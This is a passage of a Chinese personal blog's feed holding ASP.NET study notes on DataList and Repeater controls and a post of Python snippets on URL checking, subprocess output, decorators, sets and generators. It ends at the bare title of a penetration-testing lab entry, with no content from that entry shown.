CommandName&#x3D;&quot;del&quot; CommandArgument&#x3D;&#39;&lt;%# Eval(&quot;CarId&quot;) %&gt;&#39; &#x2F;&gt;</span><br><span class="line">  &lt;asp:Button ID&#x3D;&quot;btnEdit&quot; runat&#x3D;&quot;server&quot; Text&#x3D;&quot;编辑&quot;  CommandName&#x3D;&quot;edit&quot; CommandArgument&#x3D;&#39;&lt;%# Eval(&quot;CarId&quot;) %&gt;&#39;&#x2F;&gt;</span><br><span class="line">……---------------------------------------------------------------</span><br><span class="line">protected void repeaterCar_ItemCommand(object source, RepeaterCommandEventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        int carId &#x3D;Convert.ToInt32(e.CommandArgument);</span><br><span class="line">        string name &#x3D; e.CommandName.ToLower();</span><br><span class="line">        switch (name)</span><br><span class="line">        &#123;</span><br><span class="line">            case &quot;del&quot;: Page.ClientScript.RegisterStartupScript(Page.GetType(), &quot;myScript&quot;, &quot;alert(&#39;删除编号是：&quot;+carId+&quot;的车型&#39;)&quot;, true); break;</span><br><span class="line">            case &quot;edit&quot;: Page.ClientScript.RegisterStartupScript(Page.GetType(), &quot;myScript&quot;, &quot;alert(&#39;修改编号是：&quot; + carId + &quot;的车型&#39;)&quot;, true); break;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3><span id="总结">总结</span></h3><ul><li><p><strong>DataList</strong>控件可用于创建模板化的列表数据，可用于设计任何重复结构中的数据。</p></li><li><p>实现<strong>DataList</strong>控件的分页需要借助于<strong>PagedDataSource</strong>控件</p></li><li><p><strong>Repeater</strong>控件不会自动生成任何HTML标签，所以带来了效率上的提升，也使精确展示内容成为可能。</p></li><li><p>实现<strong>Repeater</strong>的分页方法和<strong>DataList</strong>一样，可以使用<strong>PagedDataSource</strong>也可以调用存储过程实现，只不过呈现数据的载体不一样而已。</p></li><li><p>当点击<strong>Repeater</strong>中的按钮控件时会触发<strong>Repeater</strong>控件的<strong>ItemCommand</strong>事件。</p></li><li><p>设置<strong>CommandName</strong>属性来标识<strong>Repeater</strong>控件中的按钮。</p></li><li><p>设置按钮的<strong>CommandArgument</strong>属性来标识需要被操作的数据，可能是主键。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#aspnet知识点&quot;&gt;ASP.NET知识点&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#第一章-aspnet简介&quot;&gt;第一章 ASP.NET简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#第二章-aspnet中的控件&quot;&gt;第二章 ASP.NET中的控件&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-控件分类&quot;&gt;1. 控件分类&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-页面回发&quot;&gt;2. 页面回发&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-常用控件&quot;&gt;3. 常用控件&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-label控件&quot;&gt;1. &lt;strong&gt;Label控件&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-textbox控件&quot;&gt;&lt;strong&gt;2. TextBox控件&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-image控件&quot;&gt;3. &lt;strong&gt;Image控件&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-hyperlink控件&quot;&gt;4. &lt;strong&gt;HyperLink控件&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5-radiobutton控件&quot;&gt;5. &lt;strong&gt;RadioButton控件&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#6-checkbox控件&quot;&gt;6. &lt;strong&gt;CheckBox控件&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#7-列表控件&quot;&gt;7. &lt;strong&gt;列表控件&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#8-hiddenfield控件&quot;&gt;8. &lt;strong&gt;HiddenField控件&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-服务器控件的客户端事件处理&quot;&gt;4. 服务器控件的客户端事件处理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5-总结&quot;&gt;5. 总结&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#第三章-aspnet系统对象与状态管理&quot;&gt;第三章 ASP.NET系统对象与状态管理&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-系统对象的概念&quot;&gt;1. &lt;strong&gt;系统对象的概念&lt;/strong&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-page对象&quot;&gt;1. Page对象&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-response对象&quot;&gt;2. Response对象&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-server对象&quot;&gt;3. Server对象&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-aspnet中的状态管理&quot;&gt;4. ASP.NET中的状态管理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5-cookie对象&quot;&gt;5. Cookie对象&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#6-session对象&quot;&gt;6. Session对象&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#7-application对象&quot;&gt;7. Application对象&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#8-状态管理技术的区别&quot;&gt;8. 状态管理技术的区别&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-总结&quot;&gt;2. 总结&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#第四章-基于三层架构搭建系统&quot;&gt;第四章 基于三层架构搭建系统&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-为什么需要分层架构&quot;&gt;1. &lt;strong&gt;为什么需要分层架构&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-三层结构的优势&quot;&gt;2. 三层结构的优势&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-模型层&quot;&gt;3. 模型层&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#3-1-创建模型层&quot;&gt;3-1 创建模型层&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-数据访问层&quot;&gt;4. 数据访问层&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#4-1-创建数据访问层&quot;&gt;4-1 创建数据访问层&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-2-添加依赖&quot;&gt;4-2 添加依赖&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5-业务逻辑层&quot;&gt;5. 业务逻辑层&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#5-1-创建业务逻辑层&quot;&gt;5-1 创建业务逻辑层&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5-2-添加依赖&quot;&gt;5-2 添加依赖&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#6-表示层&quot;&gt;6. 表示层&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#6-1-创建表示层&quot;&gt;6-1 创建表示层&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#6-2-添加依赖&quot;&gt;6-2 添加依赖&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#7-目录结构&quot;&gt;7. 目录结构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#8-总结&quot;&gt;8. 总结&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#第五章-搭建风格统一的web站点&quot;&gt;第五章 搭建风格统一的Web站点&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-母版页&quot;&gt;1. 母版页&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-母版页的优点&quot;&gt;2. 母版页的优点&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-创建母版页&quot;&gt;3. 创建母版页&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#3-1-母版页的源文件&quot;&gt;3-1 母版页的源文件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-2-普通页面与母版页的区别&quot;&gt;3-2 普通页面与母版页的区别&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-创建内容页&quot;&gt;4. 创建内容页&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#4-1-新创建的内容页代码&quot;&gt;4-1 新创建的内容页代码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-2-将现有页面改为内容页&quot;&gt;4-2 将现有页面改为内容页&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5-站点地图&quot;&gt;5. 站点地图&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#6-treeview控件&quot;&gt;6. TreeView控件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#7-sitemappath&quot;&gt;7. SiteMapPath&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#8-总结&quot;&gt;8. &lt;strong&gt;总结&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#第六章-验证控件和上传控件&quot;&gt;第六章 验证控件和上传控件&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-数据验证控件&quot;&gt;1. 数据验证控件&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-requiredfieldvalidator&quot;&gt;1. &lt;strong&gt;RequiredFieldValidator&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-rangevalidator&quot;&gt;2. &lt;strong&gt;RangeValidator&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-comparevalidator&quot;&gt;3. &lt;strong&gt;CompareValidator&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-regularexpressionvalidator&quot;&gt;4. &lt;strong&gt;RegularExpressionValidator&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5-customvalidator&quot;&gt;5. &lt;strong&gt;CustomValidator&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#6-validationsummary&quot;&gt;6. &lt;strong&gt;ValidationSummary&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#7-pageisvalid&quot;&gt;7. &lt;strong&gt;Page.IsValid&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#8-禁用验证&quot;&gt;8. &lt;strong&gt;禁用验证&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#9-文件上传控件&quot;&gt;9. &lt;strong&gt;文件上传控件&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-总结-1&quot;&gt;2. 总结&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#第七章-数据绑定和gridview控件&quot;&gt;第七章-数据绑定和GridView控件&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-数据绑定&quot;&gt;1. 数据绑定&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-1-数据绑定机制&quot;&gt;1-1 数据绑定机制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#1-2-数据绑定表达式语法&quot;&gt;1-2 数据绑定表达式语法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-gridview控件&quot;&gt;2. GridView控件&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#2-1-使用gridview控件呈现数据&quot;&gt;2-1 使用GridView控件呈现数据&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-2-手动创建gridview列&quot;&gt;2-2 手动创建GridView列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-3-boundfield&quot;&gt;2-3. BoundField&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-4-imagefield&quot;&gt;2-4 ImageField&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-5-templatefield&quot;&gt;2-5 TemplateField&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-6-commandfield&quot;&gt;2-6 CommandField&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-7-hyperlinkfield&quot;&gt;2-7 HyperLinkField&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-8-gridview的分页&quot;&gt;2-8 GridView的分页&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-9-设置gridview的样式&quot;&gt;2-9 设置GridView的样式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-总结&quot;&gt;3. &lt;strong&gt;总结&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#第八章-gridview控件的使用二&quot;&gt;第八章 GridView控件的使用（二）&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-gridview控件的编辑功能&quot;&gt;1. GridView控件的编辑功能&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-高亮显示鼠标悬浮的行数据&quot;&gt;2. 高亮显示鼠标悬浮的行数据&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-detailsview控件&quot;&gt;3. DetailsView控件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#总结&quot;&gt;总结&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#第九章-使用datalist和repeater绑定数据&quot;&gt;第九章 使用DataList和Repeater绑定数据&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-datalist控件的使用&quot;&gt;1. DataList控件的使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-datalist控件的重要属性&quot;&gt;2. DataList控件的重要属性&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-实现datalist控件的分页&quot;&gt;3. 实现DataList控件的分页&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-repeater控件的使用&quot;&gt;4. Repeater控件的使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#总结-1&quot;&gt;总结&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="ASP.NET" scheme="https://atc96.top/categories/ASP-NET/"/>
    
    
      <category term="ASP.NET" scheme="https://atc96.top/tags/ASP-NET/"/>
    
  </entry>
  
  <entry>
    <title>python-note</title>
    <link href="https://atc96.top/python-note/"/>
    <id>https://atc96.top/python-note/</id>
    <published>2020-05-31T12:24:24.000Z</published>
    <updated>2020-06-16T14:24:10.678Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#python笔记">python笔记</a><ul><li><a href="#一-常用函数">一、常用函数</a><ul><li><a href="#1url检测">1.Url检测</a></li><li><a href="#2-实时获得控制台输出">2. 实时获得控制台输出</a></li></ul></li><li><a href="#二-飘逸的语法">二. 飘逸的语法</a><ul><li><a href="#1-python带参数的装饰器">1. python带参数的装饰器</a></li><li><a href="#2-求两个集合之间的交并差集">2. 求两个集合之间的交并差集</a></li><li><a href="#3-python生成器的简单使用">3. python生成器的简单使用</a></li></ul></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="python笔记">python笔记</span></h1><h2><span id="一-常用函数">一、常用函数</span></h2><h3><span id="1url检测">1.Url检测</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_url</span><span class="params">(_u)</span>:</span></span><br><span class="line">    regex = re.compile(</span><br><span class="line">    <span class="string">r'^(?:http|ftp)s?://'</span></span><br><span class="line">    <span class="string">r'(?:(?:[A-Z0-9](?:[A-Z0-9-]&#123;0,61&#125;[A-Z0-9])?\.)+(?:[A-Z]&#123;2,6&#125;\.?|[A-Z0-9-]&#123;2,&#125;\.?)|'</span>  <span class="comment"># domain...</span></span><br><span class="line">    <span class="string">r'localhost|'</span>  <span class="comment"># localhost...</span></span><br><span class="line">    <span class="string">r'\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)'</span>  <span class="comment"># ...or ip</span></span><br><span class="line">    <span class="string">r'(?::\d+)?'</span>  <span class="comment"># optional port</span></span><br><span class="line">    <span class="string">r'(?:/?|[/?]\S+)$'</span>, re.IGNORECASE)</span><br><span class="line">    <span class="keyword">return</span> regex.match(_u)</span><br></pre></td></tr></table></figure><h3><span id="2-实时获得控制台输出">2. 实时获得控制台输出</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> locale</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stdout</span><span class="params">(RUN_CMD)</span>:</span></span><br><span class="line">    ps = subprocess.Popen(RUN_CMD, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = ps.stdout.readline()</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b''</span>:</span><br><span class="line">            <span class="keyword">if</span> ps.poll() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(data.decode(codecs.lookup(locale.getpreferredencoding()).name))</span><br></pre></td></tr></table></figure><h2><span id="二-飘逸的语法">二. 飘逸的语法</span></h2><h3><span id="1-python带参数的装饰器">1.  python带参数的装饰器</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 带参数的装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_line</span><span class="params">(char=<span class="string">'-'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    功能: 根据参数生成不同的装饰器</span></span><br><span class="line"><span class="string">    :param char: 显示分割线的字符</span></span><br><span class="line"><span class="string">    :return:返回一个装饰器</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">char_decorator</span><span class="params">(func)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        功能: 一个装饰器,给函数打印一个分割线</span></span><br><span class="line"><span class="string">        :param func:需要执行的参数</span></span><br><span class="line"><span class="string">        :return:返回对应的执行函数</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># TODO</span></span><br><span class="line">        print(char * <span class="number">15</span>, <span class="string">'function:'</span>, func.__name__, char * <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">lambda</span> *args, **kwargs: func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> char_decorator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 带参数的装饰器的使用</span></span><br><span class="line"><span class="meta">@print_line('-')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">line</span><span class="params">(print_text)</span>:</span></span><br><span class="line">    <span class="comment"># print(print_text)</span></span><br><span class="line">    <span class="keyword">return</span> print_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(line(<span class="string">'请帮我把这段话返回出来'</span>))</span><br></pre></td></tr></table></figure><h3><span id="2-求两个集合之间的交并差集">2. 求两个集合之间的交并差集</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">l1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>)]</span><br><span class="line">l2 = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>, <span class="number">2</span>)]</span><br><span class="line">l3 = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">print(l1, l2, l3)</span><br><span class="line"><span class="comment"># 1. l1和l2两个集合的并集</span></span><br><span class="line">print(set(l1).union(set(l2)))</span><br><span class="line">print(set(l1) | set(l2))</span><br><span class="line"><span class="comment"># 2. l1和l3两个集合的交集</span></span><br><span class="line">print(set(l1).intersection(set(l3)))</span><br><span class="line">print(set(l1) &amp; set(l3))</span><br><span class="line"><span class="comment"># 2. l2和l3两个集合的差集</span></span><br><span class="line">print(set(l1).difference(set(l3)))</span><br><span class="line">print(set(l1) - set(l3))</span><br><span class="line">print(set(l3).difference(set(l1)))</span><br><span class="line">print(set(l3) - set(l1))</span><br></pre></td></tr></table></figure><h3><span id="3-python生成器的简单使用">3. python生成器的简单使用</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成器的两种实现</span></span><br><span class="line"><span class="comment"># 生成器具有迭代器的属性</span></span><br><span class="line"><span class="comment"># 所以可以直接使用 for in来进行遍历或者使用内建的next函数来遍历</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 使用列表推导式</span></span><br><span class="line">gen = (num <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">10000</span>) <span class="keyword">if</span> <span class="keyword">not</span> num % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 使用生成器函数 (yield)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_func</span><span class="params">(_n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    功能: 生成一个包含数值0-_n的生成器</span></span><br><span class="line"><span class="string">    :param _n:指定执行范围</span></span><br><span class="line"><span class="string">    :return:返回一个生成器</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(_n):</span><br><span class="line">        <span class="keyword">yield</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># main function</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 列表推导式的遍历</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> gen:</span><br><span class="line">        print(num)</span><br><span class="line">    <span class="comment"># 生成器函数的遍历</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> gen_func(<span class="number">10</span>):</span><br><span class="line">        print(num)</span><br><span class="line">    help(gen_func) <span class="comment"># 打印函数的说明</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#python笔记&quot;&gt;python笔记&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#一-常用函数&quot;&gt;一、常用函数&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1url检测&quot;&gt;1.Url检测&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-实时获得控制台输出&quot;&gt;2. 实时获得控制台输出&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#二-飘逸的语法&quot;&gt;二. 飘逸的语法&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-python带参数的装饰器&quot;&gt;1. python带参数的装饰器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-求两个集合之间的交并差集&quot;&gt;2. 求两个集合之间的交并差集&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-python生成器的简单使用&quot;&gt;3. python生成器的简单使用&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://atc96.top/categories/Python/"/>
    
    
      <category term="Python" scheme="https://atc96.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>HA:chanakya靶机渗透</title>
    <link href="https://atc96.top/Chanakya/"/>
    <id>https://atc96.top/Chanakya/</id>
    <published>2020-05-19T12:39:42.000Z</published>
    <updated>2020-05-20T04:04:25.986Z</updated>
    
